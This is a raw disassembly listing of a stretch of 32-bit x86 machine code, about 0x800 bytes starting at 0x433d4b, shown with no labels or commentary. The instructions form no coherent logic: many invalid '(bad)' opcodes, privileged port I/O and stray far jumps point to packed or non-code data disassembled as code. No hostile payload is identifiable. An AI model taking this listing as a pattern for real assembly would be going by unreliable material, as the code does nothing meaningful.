  433d4b:	lds    eax,FWORD PTR [eax-0x5]
  433d4e:	and    ecx,ebx
  433d50:	pop    ebx
  433d51:	push   0x25
  433d53:	ret    0xf1be
  433d56:	popa   
  433d57:	mov    WORD PTR [ebp-0x8021f33],es
  433d5d:	push   0x25
  433d5f:	mov    esi,0x9d9f319f
  433d64:	add    BYTE PTR [edx],bh
  433d66:	ins    BYTE PTR es:[edi],dx
  433d67:	mov    al,BYTE PTR [edi-0x173685db]
  433d6d:	push   edi
  433d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433d6f:	in     al,0xf8
  433d71:	bound  edi,QWORD PTR [edx-0x3cff793b]
  433d77:	pusha  
  433d78:	shl    DWORD PTR [edx+eiz*2+0x5a],cl
  433d7c:	inc    esp
  433d7d:	and    al,0x27
  433d7f:	lods   eax,DWORD PTR ds:[esi]
  433d80:	bound  ebx,QWORD PTR [eax]
  433d82:	sahf   
  433d83:	mov    al,ds:0xbb002024
  433d88:	add    BYTE PTR [eax],0xff
  433d8b:	push   ss
  433d8c:	icebp  
  433d8d:	not    DWORD PTR ds:0x38ee73
  433d93:	inc    esi
  433d94:	sbb    al,0x78
  433d96:	pop    esi
  433d97:	dec    eax
  433d98:	cwde   
  433d99:	and    al,0x1c
  433d9b:	mov    ebx,0xff8b4f90
  433da0:	shr    BYTE PTR [eax],0x85
  433da3:	adc    BYTE PTR [eax+0x281ee805],0xf6
  433daa:	inc    DWORD PTR [esi+0x1c]
  433dad:	ins    DWORD PTR es:[edi],dx
  433dae:	inc    esi
  433daf:	inc    eax
  433db0:	test   al,0x24
  433db2:	sub    BYTE PTR [ebx-0x2a],ah
  433db5:	inc    edi
  433db6:	call   FWORD PTR [ebx+eiz*2-0x8]
  433dba:	test   DWORD PTR [edi+ecx*4-0xf4174d1],ecx
  433dc1:	bound  eax,QWORD PTR [eax]
  433dc3:	add    BYTE PTR [edi],ch
  433dc5:	call   0xf75978f4
  433dca:	test   DWORD PTR [ebx+0x762b2081],edi
  433dd0:	mov    al,ds:0xdf4b446c
  433dd5:	repz jns 0x433d61
  433dd8:	fucomp st(6)
  433dda:	add    eax,0x44884b
  433ddf:	sub    edx,DWORD PTR [eax+0x4dc532fe]
  433de5:	add    BYTE PTR [eax],al
  433de7:	dec    ebx
  433de8:	arpl   WORD PTR [esi-0x50],di
  433deb:	add    BYTE PTR [ebx],bh
  433ded:	fadd   QWORD PTR [eax]
  433def:	push   edi
  433df0:	bound  ecx,QWORD PTR [edi-0xf]
  433df3:	xchg   edi,eax
  433df4:	jo     0x433da8
  433df6:	add    al,0xf9
  433df8:	(bad)  
  433df9:	push   ss
  433dfa:	int3   
  433dfb:	jae    0x433e3f
  433dfd:	ror    bl,1
  433dff:	jae    0x433e6b
  433e01:	outs   dx,DWORD PTR ds:[esi]
  433e02:	push   ecx
  433e03:	adc    al,0xfd
  433e05:	in     al,dx
  433e06:	in     al,dx
  433e07:	clc    
  433e08:	outs   dx,DWORD PTR ds:[esi]
  433e09:	out    dx,al
  433e0a:	retf   
  433e0b:	jae    0x433e67
  433e0d:	xchg   DWORD PTR [eax],edi
  433e0f:	and    al,0x32
  433e11:	jnp    0x433de7
  433e13:	test   BYTE PTR [ecx+0x41e8020d],bh
  433e19:	jo     0x433de4
  433e1b:	stc    
  433e1c:	sub    eax,0x295ac26b
  433e21:	jnp    0x433e04
  433e23:	pop    ebx
  433e24:	mov    al,ds:0xc67f04d1
  433e29:	cdq    
  433e2a:	(bad)  
  433e2b:	jmp    DWORD PTR [edx+0x23]
  433e2e:	xor    dl,BYTE PTR [edx+0xd]
  433e31:	jnp    0x433e3c
  433e33:	jo     0x433e40
  433e35:	ds std 
  433e37:	out    0x8d,eax
  433e39:	ins    BYTE PTR es:[edi],dx
  433e3a:	leave  
  433e3b:	stc    
  433e3c:	lea    ebp,[ebp-0xd9eebd8]
  433e42:	cld    
  433e43:	xchg   DWORD PTR [esi],esp
  433e45:	push   ds
  433e46:	hlt    
  433e47:	clc    
  433e48:	scas   al,BYTE PTR es:[edi]
  433e49:	aad    0xf8
  433e4b:	cld    
  433e4c:	ins    DWORD PTR es:[edi],dx
  433e4d:	icebp  
  433e4e:	retf   
  433e4f:	mov    ah,0x0
  433e51:	ds out 0xff,al
  433e54:	jmp    DWORD PTR [edx+0x17]
  433e57:	xchg   ecx,eax
  433e58:	and    al,0x6e
  433e5a:	repz cld 
  433e5c:	dec    DWORD PTR [ebp+0x6d]
  433e5f:	and    DWORD PTR [ecx+eiz*2],edx
  433e62:	lock cld 
  433e64:	clc    
  433e65:	neg    ah
  433e67:	clc    
  433e68:	cld    
  433e69:	xor    eax,0xf6cce7da
  433e6e:	mov    ebp,0xd96200f3
  433e73:	xchg   edx,eax
  433e74:	xchg   edi,eax
  433e75:	inc    esi
  433e76:	int    0xe6
  433e78:	add    esp,DWORD PTR [edx-0x1a]
  433e7b:	cmp    ah,BYTE PTR [edi]
  433e7d:	jbe    0x433e59
  433e7f:	out    0x3,eax
  433e81:	ficomp WORD PTR [ecx]
  433e83:	loop   0x433e0c
  433e85:	icebp  
  433e86:	(bad)  
  433e88:	add    ebx,edi
  433e8a:	inc    ebp
  433e8b:	or     edi,eax
  433e8d:	out    dx,al
  433e8e:	out    0xe6,al
  433e90:	js     0x433e40
  433e92:	mov    ebp,0xd96200f7
  433e97:	mov    dh,0x35
  433e99:	fisttp DWORD PTR [esi]
  433e9b:	outs   dx,BYTE PTR ds:[esi]
  433e9c:	fndisi(8087 only) 
  433e9e:	hlt    
  433e9f:	jmp    0xe81cfe1f
  433ea4:	add    esi,DWORD PTR [eax-0x4903fca3]
  433eaa:	out    0xe6,al
  433eac:	add    bl,BYTE PTR [ebx+0x5d]
  433eaf:	cmp    al,0x3
  433eb1:	(bad)  
  433eb2:	fldcw  WORD PTR [ebp+edx*8+0x0]
  433eb6:	imul   ebx,DWORD PTR [ebp+0x34],0x3
  433eba:	(bad)  
  433ebb:	fldcw  WORD PTR [eax+ebp*4+0x5b]
  433ebf:	pop    ebp
  433ec0:	sub    al,0x3
  433ec2:	(bad)  
  433ec3:	fptan  
  433ec5:	adc    al,0x7b
  433ec7:	int3   
  433ec8:	repz icebp 
  433eca:	xor    eax,0x5bc46cd9
  433ecf:	pop    ebp
  433ed0:	pushf  
  433ed1:	add    al,0x62
  433ed3:	fstp   DWORD PTR [esi-0x44]
  433ed6:	dec    edx
  433ed7:	mov    ecx,0x505bcb19
  433edc:	sub    esp,DWORD PTR [eax]
  433ede:	push   0x5c
  433ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433ee1:	sti    
  433ee2:	loope  0x433f16
  433ee4:	add    cl,ch
  433ee6:	popa   
  433ee7:	fld    DWORD PTR [ebp-0x7a266821]
  433eed:	mov    ecx,0x9e49d80e
  433ef2:	sbb    DWORD PTR [esi+0x44],ebx
  433ef5:	int    0xd
  433ef7:	pop    ebx
  433ef8:	rcl    BYTE PTR ds:0xd2f85ca7,0x5a
  433eff:	popf   
  433f00:	ins    BYTE PTR es:[edi],dx
  433f01:	and    eax,0xcd44525e
  433f06:	add    eax,0xdebaf996
  433f0b:	pop    ss
  433f0c:	cmc    
  433f0d:	loopne 0x433eb6
  433f0f:	fld    st(1)
  433f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433f12:	inc    ebp
  433f13:	mov    ebp,0xd966e8fd
  433f18:	stc    
  433f19:	hlt    
  433f1a:	add    BYTE PTR [ecx],dl
  433f1c:	(bad)  
  433f1d:	inc    eax
  433f1e:	jmp    0xfeb75805
  433f23:	inc    esp
  433f24:	pop    ebp
  433f25:	and    al,0x1d
  433f27:	data16 fld DWORD PTR [eax]
  433f2a:	repnz (bad) 
  433f2c:	stc    
  433f2d:	lods   ax,WORD PTR ds:[esi]
  433f2f:	popa   
  433f30:	push   0x30
  433f32:	pop    ss
  433f33:	arpl   WORD PTR [ecx-0x369e5294],bp
  433f39:	je     0x433f21
  433f3b:	ins    BYTE PTR es:[edi],dx
  433f3c:	and    eax,0xd9663524
  433f41:	add    BYTE PTR [edx+eiz*1-0x43],ch
  433f45:	sbb    al,0x99
  433f47:	test   al,0xb3
  433f49:	xchg   DWORD PTR ds:0xe9000d42,ebp
  433f4f:	popa   
  433f50:	sbb    BYTE PTR [ebp+eax*1+0x42],al
  433f54:	out    0xf8,eax
  433f56:	call   0xb55621bc
  433f5b:	dec    esi
  433f5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433f5d:	add    BYTE PTR [eax],al
  433f5f:	mov    esi,0xb3136d18
  433f64:	fld    QWORD PTR [eax+0x874b00]
  433f6a:	jmp    FWORD PTR [edi-0x47]
  433f6d:	sbb    al,0xff
  433f6f:	or     eax,0x2aa40d10
  433f74:	cdq    
  433f75:	add    bh,bh
  433f77:	jg     0x433f32
  433f79:	sbb    bh,bh
  433f7b:	push   cs
  433f7c:	jno    0x433f88
  433f7e:	inc    eax
  433f7f:	add    bl,bh
  433f81:	add    ecx,DWORD PTR [edx]
  433f83:	dec    DWORD PTR [edi-0x3c]
  433f86:	adc    al,0x3
  433f88:	or     ebx,ecx
  433f8a:	div    DWORD PTR [edi+ebx*1-0x400040b]
  433f91:	bswap  edi
  433f93:	mov    edx,DWORD PTR [ebx-0x27db83a8]
  433f99:	fdiv   DWORD PTR [ebp+eax*1+0x23]
  433f9d:	stc    
  433f9e:	mov    edi,ebp
  433fa0:	and    al,0xaf
  433fa2:	push   esi
  433fa3:	mov    edi,DWORD PTR [esi-0x4f]
  433fa6:	push   ebx
  433fa7:	or     DWORD PTR [edi-0x340005d0],0x3a002c1e
  433fb1:	or     al,0x10
  433fb3:	add    bh,BYTE PTR [ebx+0x554bd8]
  433fb9:	rol    DWORD PTR [eax+0x4ed8bf69],0xe8
  433fc0:	or     eax,0x10fff56c
  433fc5:	push   esp
  433fc6:	and    al,0x24
  433fc8:	mov    eax,ebx
  433fca:	add    BYTE PTR [eax-0x7bf83b41],cl
  433fd0:	mov    ebx,0x7b9e7ce2
  433fd5:	fadd   DWORD PTR [eax]
  433fd7:	test   DWORD PTR [edx+0x4],esp
  433fda:	push   eax
  433fdb:	pop    es
  433fdc:	dec    esp
  433fdd:	cld    
  433fde:	arpl   WORD PTR [ecx],cx
  433fe0:	out    0x80,eax
  433fe2:	add    al,0x0
  433fe4:	add    BYTE PTR [edx+0x67],ah
  433fe7:	push   0xfcf08e24
  433fec:	dec    DWORD PTR [ebp+0x7e248877]
  433ff2:	lock cld 
  433ff4:	call   DWORD PTR [ecx-0x4dae4301]
  433ffa:	dec    ebx
  433ffb:	nop
  433ffc:	and    al,0x52
  433ffe:	lock cld 
  434000:	(bad)  
  434001:	(bad)  [ebp+0xd052420]
  434007:	imul   edx,DWORD PTR [edx],0xc079f2a2
  43400d:	jnp    0x43403d
  43400f:	jp     0x43400a
  434011:	jbe    0x433fd5
  434013:	div    DWORD PTR [eax-0x3f85e3a3]
  434019:	push   esi
  43401a:	fidivr DWORD PTR [ecx-0x2b]
  43401d:	dec    esi
  43401e:	fiadd  WORD PTR [ebx+0x585eec]
  434024:	inc    ebp
  434026:	icebp  
  434027:	sub    al,0xf9
  434029:	xor    eax,0x7e4c71f6
  43402e:	out    0xd4,al
  434030:	fcom   DWORD PTR [eax-0x6fd23845]
  434036:	repnz mov es,esi
  434039:	and    BYTE PTR [ebp-0x3c],dh
  43403c:	or     DWORD PTR [esi],ebx
  43403e:	mov    eax,0x6464c7c
  434043:	xor    al,0x51
  434045:	sub    al,0xe3
  434047:	mov    BYTE PTR [eax+eax*1],ah
  43404a:	xor    dh,al
  43404c:	cld    
  43404d:	push   DWORD PTR [ebp-0x34]
  434050:	jnp    0x4340a6
  434052:	inc    esi
  434053:	fsincos 
  434055:	jl     0x4340c9
  434057:	and    DWORD PTR [ebx-0x4b],0xffffffd6
  43405b:	stos   BYTE PTR es:[edi],al
  43405c:	ins    BYTE PTR es:[edi],dx
  43405d:	rcr    edx,1
  43405f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434060:	data16 or al,0x62
  434063:	ins    DWORD PTR es:[edi],dx
  434064:	adc    ecx,ecx
  434066:	ja     0x4340b6
  434068:	in     al,dx
  434069:	out    0xce,eax
  43406b:	popf   
  43406c:	out    0x76,eax
  43406e:	sahf   
  43406f:	mov    ebp,0x7e3a33cf
  434074:	mov    ds:0xfcef2bc8,eax
  434079:	enter  0xbdd6,0xc3
  43407d:	add    eax,0x8f8ad962
  434082:	inc    esi
  434083:	mov    ch,0xe5
  434085:	add    esp,DWORD PTR [edx-0x75]
  434088:	jp     0x434019
  43408a:	inc    esi
  43408b:	mov    ch,0xe5
  43408d:	add    esp,DWORD PTR [edx-0x1e]
  434090:	xchg   ebx,eax
  434091:	jl     0x434085
  434093:	pop    ecx
  434094:	jecxz  0x4340b5
  434096:	pop    ebx
  434097:	(bad)  
  434099:	inc    ch
  43409b:	out    dx,al
  43409c:	pop    ebp
  43409d:	(bad)  
  43409e:	fisttp DWORD PTR [esi+0x21]
  4340a1:	sub    DWORD PTR [ecx],ebp
  4340a3:	jle    0x43410d
  4340a5:	mov    edi,0x3e7d772
  4340aa:	cld    
  4340ab:	leave  
  4340ac:	out    0x76,eax
  4340ae:	add    BYTE PTR [ebp-0xc],dh
  4340b1:	gs retf 
  4340b3:	pop    ebx
  4340b4:	shr    BYTE PTR [edx+0x72],cl
  4340b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4340b8:	loop   0x4340a0
  4340ba:	enter  0x5c46,0x7c
  4340be:	and    BYTE PTR [edi-0x27],dl
  4340c1:	addr16 int 0x3b
  4340c4:	ins    DWORD PTR es:[edi],dx
  4340c5:	loope  0x43404a
  4340c7:	mov    WORD PTR [edi+0xefdea73],gs
  4340cd:	add    cl,cl
  4340cf:	loope  0x4340bc
  4340d1:	pop    esi
  4340d2:	fsubrp st(7),st
  4340d4:	ins    DWORD PTR es:[edi],dx
  4340d5:	(bad)  
  4340d6:	call   0x64399a3c
  4340db:	push   ebp
  4340dc:	pop    ecx
  4340dd:	gs call 0xf5aa1a44
  4340e3:	sub    bl,ah
  4340e5:	out    0x79,ax
  4340e8:	and    al,0x86
  4340ea:	stos   DWORD PTR es:[edi],eax
  4340eb:	cmp    al,dl
  4340ed:	cmp    al,0x48
  4340ef:	nop
  4340f0:	fdivr  DWORD PTR [ebx+esi*1]
  4340f3:	popf   
  4340f4:	in     al,0x85
  4340f6:	test   al,0x21
  4340f8:	pop    ecx
  4340f9:	mul    bl
  4340fb:	adc    al,0x57
  4340fd:	inc    ebp
  4340fe:	call   0xf4aa1a64
  434103:	cmp    DWORD PTR [eax+eax*4],esp
  434106:	sub    DWORD PTR [ebp-0x30],0xffffff83
  43410a:	mov    edi,0x300d966
  43410f:	add    al,0x8a
  434111:	mov    ebp,0xb0180069
  434116:	or     DWORD PTR [edi+ecx*2-0x1e],ebp
  43411a:	clc    
  43411b:	jmp    0x2a9c095b
  434120:	fsubp  st(2),st
  434122:	push   esp
  434123:	aam    0xcd
  434125:	jnp    0x43413f
  434127:	mov    eax,ds:0xedbe5aa0
  43412c:	and    DWORD PTR [ebp-0x624a44a1],0x61b9b776
  434136:	neg    cl
  434138:	sbb    eax,0x6f2380d6
  43413d:	pop    edi
  43413e:	or     ch,BYTE PTR [ecx-0x58]
  434141:	scas   al,BYTE PTR es:[edi]
  434142:	je     0x434124
  434144:	loope  0x434130
  434146:	sub    al,BYTE PTR [eax]
  434148:	mov    WORD PTR [eax+0x0],ds
  43414b:	add    DWORD PTR [ebx-0x2ce49d2b],ecx
  434151:	push   ss
  434152:	add    dl,0x8f
  434155:	mov    ch,0x3c
  434157:	popa   
  434158:	or     ecx,ebx
  43415a:	cmp    al,0x7a
  43415c:	mov    ch,0x5
  43415e:	cmp    dl,0x7b
  434161:	xchg   ecx,eax
  434162:	std    
  434163:	jg     0x434196
  434165:	into   
  434166:	jbe    0x43414e
  434168:	mov    ebx,0x2a742612
  43416d:	pop    ebp
  43416e:	repnz sub eax,0xfa803177
  434174:	sub    al,0xe8
  434176:	jl     0x4341e4
  434178:	add    ah,bh
  43417a:	pop    ss
  43417b:	test   DWORD PTR [eax+0xd74d2c1],0xf37128b
  434185:	xchg   BYTE PTR [ecx],bl
  434187:	add    BYTE PTR [eax],al
  434189:	sti    
  43418a:	adc    BYTE PTR [edi],0x58
  43418d:	enter  0x1c82,0x58
  434191:	enter  0xf25c,0x5d
  434195:	mul    al
  434197:	bound  ebx,QWORD PTR [edx]
  434199:	and    ebx,DWORD PTR [eax+eax*4]
  43419c:	cli    
  43419d:	jnp    0x434130
  43419f:	std    
  4341a0:	jg     0x4341d3
  4341a2:	int    0x76
  4341a4:	adc    eax,0x200c1a41
  4341a9:	pop    edi
  4341aa:	jbe    0x434216
  4341ac:	add    al,0xbf
  4341ae:	jle    0x43421e
  4341b0:	or     DWORD PTR [ebx+0x12],ecx
  4341b3:	xor    cl,BYTE PTR [edi]
  4341b5:	inc    esi
  4341b6:	imul   eax,DWORD PTR [eax],0x1182bb00
  4341bc:	pop    eax
  4341bd:	dec    eax
  4341be:	pop    esp
  4341bf:	repnz das 
  4341c1:	(bad)  
  4341c2:	idiv   DWORD PTR [eax+0x1f]
  4341c5:	(bad)  
  4341c6:	iret   
  4341c7:	ret    0x8880
  4341ca:	pop    ss
  4341cb:	dec    ecx
  4341cc:	mov    edx,0x800dcce2
  4341d1:	js     0x4341cc
  4341d3:	dec    ecx
  4341d4:	jne    0x4341ce
  4341d6:	or     al,0x25
  4341d8:	mov    ebp,0x80be4055
  4341dd:	add    BYTE PTR [edx],bl
  4341df:	adc    bh,BYTE PTR [ecx+0x40]
  4341e2:	(bad)  
  4341e4:	repz xor BYTE PTR [edx+0xf],0xc3
  4341e9:	stc    
  4341ea:	loop   0x434207
  4341ec:	pop    ds
  4341ed:	jae    0x4341c5
  4341ef:	mov    ebx,DWORD PTR ds:0x8af72158
  4341f5:	mov    esi,0x83e469e2
  4341fa:	mov    ds:0x6673fcf2,al
  4341ff:	int3   
  434200:	and    al,0x58
  434202:	and    DWORD PTR [edx-0x3a],esi
  434205:	sbb    eax,0xf6845796
  43420a:	inc    ebp
  43420b:	fnstsw WORD PTR [eax]
  43420d:	in     eax,0xf2
  43420f:	out    dx,al
  434210:	mov    bh,BYTE PTR [esi-0x7c1b561e]
  434216:	mov    ds:0x5e73fcf2,al
  43421b:	or     al,0x1f
  43421d:	pop    eax
  43421e:	mov    eax,ds:0x651dc671
  434223:	outs   dx,BYTE PTR ds:[esi]
  434224:	scas   al,BYTE PTR es:[edi]
  434225:	cli    
  434226:	int    0x8e
  434228:	test   dh,dh
  43422a:	test   DWORD PTR ds:0xeecee519,ebx
  434230:	mov    bh,BYTE PTR [esi-0x7c1b961e]
  434236:	and    dh,dl
  434238:	cld    
  434239:	or     bh,bl
  43423b:	fcomp  DWORD PTR [esi-0x3a]
  43423e:	fbld   TBYTE PTR [esi-0x36]
  434242:	add    BYTE PTR [edi-0x30],dh
  434245:	imul   edx,DWORD PTR [edx-0x7bf62078],0xffffff8c
  43424c:	lahf   
  43424d:	bnd jg 0x434215
  434250:	fdivp  st(1),st
  434252:	les    eax,FWORD PTR [edi+0x19]
  434255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434256:	rcr    cl,0x91
  434259:	out    0xff,eax
  43425b:	inc    ebx
  43425c:	pushf  
  43425d:	out    0x18,eax
  43425f:	sbb    BYTE PTR [edx-0x657fc319],0xe7
  434266:	das    
  434267:	sbb    BYTE PTR [edx-0x657f9d19],0xe7
  43426e:	test   eax,0xb2e79a80
  434273:	sbb    BYTE PTR [edx-0x657f6e19],0xe7
  43427a:	jno    0x4341fc
  43427c:	call   0xc6e7:0x9a42f8e7
  434283:	inc    eax
  434284:	call   0x13e7:0x9a42ece7
  43428b:	inc    ebx
  43428c:	call   0x37e7:0x9a4313e7
  434293:	inc    ebx
  434294:	call   0x80e7:0x9a4357e7
  43429b:	div    BYTE PTR [ebp-0x3679a09a]
  4342a1:	out    0x30,eax
  4342a3:	xor    DWORD PTR [edi+0x3300d25e],eax
  4342a9:	push   ebx
  4342aa:	mov    eax,ds:0x6711dfec
  4342af:	loop   0x4342ec
  4342b1:	push   eax
  4342b2:	xchg   ebx,eax
  4342b3:	pop    ds
  4342b4:	dec    esi
  4342b5:	push   eax
  4342b6:	add    BYTE PTR [ebp-0x627756b3],bh
  4342bc:	inc    ebp
  4342bd:	int3   
  4342be:	je     0x4342ae
  4342c0:	jb     0x4342db
  4342c2:	out    0x56,eax
  4342c4:	(bad)  
  4342c5:	fld    DWORD PTR [eax]
  4342c7:	push   0x25
  4342c9:	mov    ch,0x3c
  4342cb:	jmp    0xb7c9dce4
  4342d0:	pusha  
  4342d1:	push   ebp
  4342d2:	(bad)  
  4342d3:	jne    0x434323
  4342d5:	pop    ecx
  4342d6:	imul   ebx
  4342d8:	pop    ds
  4342d9:	sti    
  4342da:	jg     0x4342cc
  4342dc:	fs push 0xffffffdf
  4342df:	imul   ebx,DWORD PTR [edi],0xdebd74ce
  4342e5:	in     eax,0x3a
  4342e7:	pop    esp
  4342e8:	ins    DWORD PTR es:[edi],dx
  4342e9:	push   esp
  4342ea:	ds icebp 
  4342ec:	ficomp DWORD PTR [eax]
  4342ee:	je     0x434289
  4342f0:	in     eax,dx
  4342f1:	adc    bh,cl
  4342f3:	cdq    
  4342f4:	jmp    0x43430e
  4342f6:	je     0x434299
  4342f8:	fcomp  QWORD PTR [edx-0x3326faef]
  4342fe:	add    DWORD PTR [ecx-0x58],esi
  434301:	enter  0x5de5,0xa
  434305:	push   esi
  434306:	or     al,0xe1
  434308:	fstp   DWORD PTR [edx+0x2100da11]
  43430e:	cdq    
  43430f:	out    0x12,eax
  434311:	fld    DWORD PTR gs:[eax]
  434314:	jae    0x4342be
  434316:	fiadd  WORD PTR [ebp+0x2da5fa05]
  43431c:	xchg   edx,eax
  43431d:	bound  esi,QWORD PTR [ebx+0x55c2ad09]
  434323:	pop    esp
  434324:	add    eax,0x15d5acca
  434329:	(bad)  
  43432a:	rol    BYTE PTR [esp+ebp*1-0x29],1
  43432e:	jl     0x434354
  434330:	add    bh,al
  434332:	in     eax,dx
  434333:	or     al,0x33
  434335:	sbb    cl,0x6
  434338:	mov    edi,edi
  43433a:	cmc    
  43433b:	xor    al,0xf
  43433d:	std    
  43433e:	clc    
  43433f:	sbb    BYTE PTR [edi+ebp*4-0xf],0x85
  434344:	sbb    al,0xb3
  434346:	adc    al,BYTE PTR [esp-0x6d]
  43434a:	jmp    0x4ebf4347
  43434f:	cmc    
  434350:	mov    edi,eax
  434352:	cmc    
  434353:	and    al,0x3b
  434355:	push   eax
  434356:	retf   0x4c84
  434359:	jns    0x434334
  43435b:	add    BYTE PTR [eax-0x75c72b0b],al
  434361:	mov    al,fs:0xd17dff10
  434367:	jns    0x4343e7
  434369:	aas    
  43436a:	fld    DWORD PTR [eax+0x1]
  43436d:	cmp    ecx,eax
  43436f:	jg     0x434374
  434371:	add    BYTE PTR [edx],bl
  434373:	fld    DWORD PTR [eax]
  434375:	shrd   DWORD PTR [edx+0x20b847f9],edx,cl
  43437c:	xor    eax,0x96ebc0f
  434381:	add    BYTE PTR [ebx],cl
  434383:	sbb    BYTE PTR [eax*4+0x3bde8a],ah
  43438a:	jnp    0x4343a7
  43438c:	add    eax,0xfacb7f0f
  434391:	dec    DWORD PTR [ebx]
  434393:	pop    ecx
  434394:	repz or al,BYTE PTR [edx*2-0x2704fe06]
  43439c:	and    BYTE PTR [esi],0xf8
  43439f:	push   ebx
  4343a0:	inc    esi
  4343a1:	or     BYTE PTR [ebx+edx*2+0x46],al
  4343a5:	or     al,0x34
  4343a7:	dec    esi
  4343a8:	(bad)  
  4343a9:	jg     0x43440d
  4343ab:	xchg   DWORD PTR [ebp+0x9],eax
  4343ae:	fimul  WORD PTR [esi+0x4]
  4343b1:	add    BYTE PTR [edx-0x32],ah
  4343b4:	shl    BYTE PTR [esi+0x53],0x6a
  4343b8:	pop    es
  4343b9:	pop    eax
  4343ba:	fisubr DWORD PTR [esp+eax*1]
  4343bd:	in     eax,0xed
  4343bf:	jb     0x43437b
  4343c1:	or     ebp,DWORD PTR [ebp+0x6e]
  4343c4:	out    0xfc,al
  4343c6:	xchg   ebp,eax
  4343c7:	bnd jl 0x4343bf
  4343ca:	pop    eax
  4343cb:	xrelease xchg DWORD PTR [ebp-0x3e030da0],esi
  4343d2:	and    al,0xf1
  4343d4:	cmc    
  4343d5:	in     al,0x0
  4343d7:	aad    0x72
  4343d9:	mov    edx,0x836e5d0b
  4343de:	add    al,0x62
  4343e0:	bnd jl 0x4343d8
  4343e3:	push   0x610981e3
  4343e8:	repnz cld 
  4343ea:	jl     0x4343ba
  4343ec:	into   
  4343ed:	and    BYTE PTR [eax],al
  4343ef:	sbb    al,0xb4
  4343f1:	std    
  4343f2:	sub    eax,0x668b70b6
  4343f7:	data16 jne 0x4343a3
  4343fa:	je     0x43446f
  4343fc:	ja     0x434456
  4343fe:	and    al,0x46
  434400:	ja     0x4343c9
  434402:	and    eax,0x85190ea6
  434407:	and    al,0xa2
  434409:	mov    edi,0x3831e7d3
  43440e:	push   es
  43440f:	fdiv   DWORD PTR [ebx-0x1a19dbe9]
  434415:	add    BYTE PTR [eax+0x4a8b039c],cl
  43441b:	push   ebp
  43441c:	jb     0x4343bb
  43441e:	jns    0x4343fa
  434420:	mov    ebp,0xd96d0ce8
  434425:	ins    BYTE PTR es:[edi],dx
  434426:	call   0x8d2a1fff
  43442b:	ss mov ch,0xfb
  43442e:	test   BYTE PTR [esi],bh
  434430:	mov    ch,0xeb
  434432:	add    eax,ebp
  434434:	test   al,0xe8
  434436:	add    esp,DWORD PTR [edx+0x59]
  434439:	ds in  al,0x0
  43443c:	pop    edx
  43443d:	push   ebp
  43443e:	clc    
  43443f:	pop    es
  434440:	(bad)  
  434441:	fnstcw WORD PTR [ebp+0x3f9f3a0a]
  434447:	adc    esi,ebx
  434449:	mov    dl,0xe3
  43444b:	add    esp,DWORD PTR [edx+0x13]
  43444e:	test   eax,0xc5f23902
  434453:	sar    BYTE PTR [ebx-0x25],0x66
  434457:	mov    ebp,0x9464cc5c
  43445c:	pusha  
  43445d:	(bad)  
  43445f:	lea    esp,[eax+0x19]
  434462:	inc    DWORD PTR ds:0x86f2d20a
  434468:	jb     0x43443f
  43446a:	out    0x3,eax
  43446c:	and    BYTE PTR [eax+ebp*8+0x54c9fdfb],dl
  434473:	push   cs
  434474:	loop   0x4344d1
  434476:	fld    DWORD PTR [esi]
  434478:	scas   al,BYTE PTR es:[edi]
  434479:	aad    0xf6
  43447b:	ret    
  43447c:	inc    edi
  43447d:	xlat   BYTE PTR ds:[ebx]
  43447e:	test   bl,0xa2
  434481:	sbb    edi,eax
  434483:	or     BYTE PTR [eax+ebx*1+0x6f],ah
  434487:	dec    ecx
  434488:	jae    0x4344d8
  43448a:	and    eax,0x1b19e114
  43448f:	sbb    edi,ebx
  434491:	or     ecx,DWORD PTR [edx-0x190e802d]
  434497:	aaa    
  434498:	pop    esp
  434499:	xchg   ecx,eax
  43449a:	jmp    0xe9:0xc95f86
  4344a1:	popa   
  4344a2:	pop    ecx
  4344a3:	or     ch,BYTE PTR [ecx-0x12]
  4344a6:	test   DWORD PTR [edi*8+0x69118fe7],esp
  4344ad:	add    BYTE PTR [ecx-0x78],ah
  4344b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4344b1:	mov    ebp,0xa76509cd
  4344b6:	(bad)  
  4344b8:	inc    esi
  4344b9:	or     bl,bl
  4344bb:	or     cl,ch
  4344bd:	popa   
  4344be:	push   esp
  4344bf:	dec    edx
  4344c0:	loope  0x434498
  4344c2:	push   ss
  4344c3:	and    eax,0x24956626
  4344c8:	in     eax,0xf8
  4344ca:	push   esp
  4344cb:	out    0x72,al
  4344cd:	sub    ecx,ebp
  4344cf:	xor    eax,0x6ed34a3c
  4344d4:	in     eax,0x7e
  4344d6:	adc    ch,BYTE PTR [ebp-0x13]
  4344d9:	out    0x1a,al
  4344db:	test   DWORD PTR [ebx],edx
  4344dd:	fisub  WORD PTR [ebp+0x24]
  4344e0:	leave  
  4344e1:	fsubr  st(7),st
  4344e3:	or     BYTE PTR [ebp+0x2c8b41a],ah
  4344e9:	cmp    edx,DWORD PTR [esp+ebp*2+0x5]
  4344ed:	dec    esi
  4344ee:	xchg   edx,eax
  4344ef:	xchg   DWORD PTR [ebp+0x3a],ebx
  4344f2:	mov    edx,0xaa4a5585
  4344f7:	std    
  4344f8:	shr    cl,0x19
  4344fb:	xchg   DWORD PTR [edi],ebp
  4344fd:	pop    esi
  4344fe:	push   ebx
  4344ff:	dec    esp
  434500:	or     eax,0xdd525251
  434505:	add    BYTE PTR [eax+0x1b],ch
  434508:	test   DWORD PTR ds:0x6409c60a,edi
  43450e:	icebp  
  43450f:	fadd   DWORD PTR [eax]
  434511:	jmp    0xc967a1f6
  434516:	popa   
  434517:	pop    ss
  434518:	inc    edx
  434519:	add    BYTE PTR [edx],cl
  43451b:	fadd   QWORD PTR [edi]
  43451d:	test   BYTE PTR [eax+0x1b],al
  434520:	idiv   edi
  434522:	sub    BYTE PTR [edi-0x5ea17aec],0x2d
  434529:	mov    edx,DWORD PTR [edi]
  43452b:	repnz sbb BYTE PTR [ebx+0x243cee84],cl
  434532:	pop    ebx
  434533:	dec    esi
  434534:	mov    BYTE PTR [eax-0x5],0x1a
  434538:	int    0x85
  43453a:	mov    esp,DWORD PTR [ecx-0x3cfa75fe]
  434540:	and    al,0x86
  434542:	mov    edi,0xb44688d3
  434547:	dec    edi
  434548:	inc    esi
  434549:	pop    ss
